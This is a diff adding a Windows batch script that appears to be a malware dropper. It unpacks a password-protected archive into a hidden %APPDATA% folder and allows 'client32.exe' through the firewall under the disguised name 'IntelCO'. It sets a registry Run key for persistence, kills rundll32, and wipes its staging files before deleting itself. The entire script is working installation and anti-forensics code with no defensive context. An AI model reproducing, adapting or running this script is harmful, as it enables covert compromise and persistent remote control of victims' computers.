@@ -1,0 +1,41 @@
+cd "%APPDATA%"
+attrib +h "%APPDATA%\u95miN.cmd"
+if exist "%APPDATA%\zer0.bin" goto end
+if exist "%APPDATA%\rtv.bin" goto end
+ping 192.168.1.8 -n 1
+"%APPDATA%\z4g5547Dg.exe" x -p667D0M0Veq3N0KGGS54 -y "%APPDATA%\Fn84849z444" -o"%APPDATA%"
+attrib +h +s +r "%APPDATA%\core64\*.*"
+attrib +h +s +r "%APPDATA%\core64"
+del /f /q "%APPDATA%\core64"
+ping 192.168.1.5 -n 2
+cd "%APPDATA%"
+cd core64
+netsh firewall add allowedprogram "%APPDATA%\core64\client32.exe" IntelCO ENABLE
+if exist client32.exe start client32.exe
+taskkill /f /im rundll32.exe
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v "IntelCO" /t REG_SZ /d "%APPDATA%\core64\client32.exe"
+taskkill /f /im client32.exe
+ping 127.0.0.10 -n 1
+if exist client32.exe start client32.exe
+taskkill /f /im rundll32.exe
+echo 1>"%APPDATA%\zer0.bin"
+attrib +s +h "%APPDATA%\zer0.bin"
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v "IntelCO" /t REG_SZ /d "%APPDATA%\core64\client32.exe"
+:end
+attrib -h "%APPDATA%\u95miN.cmd"
+if not exist "%APPDATA%\java.exe" (del /f /q "%APPDATA%\z4g5547Dg.exe")
+del /f /q "%APPDATA%\Fn84849z444"
+del /f /q "%APPDATA%\z4g5547Dg.exe"
+ping 127.0.0.8 -n 1
+del /f /q "%APPDATA%\dASdn4321241.js"
+del /f /q "%APPDATA%\dASdn4321241.jpg"
+ping 127.0.0.30 -n 1
+del /f /q "%APPDATA%\pominki.txt"
+del /f /q "%APPDATA%\sad43.js"
+del /f /q "%APPDATA%\sad43.jpg"
+ping 127.0.0.11 -n 1
+del /f /q "%APPDATA%\input"
+attrib -h "%APPDATA%\u95miN.cmd"
+del /f /q "%APPDATA%\u95miN.cmd"
+ping 127.0.0.8 -n 1
+del %0
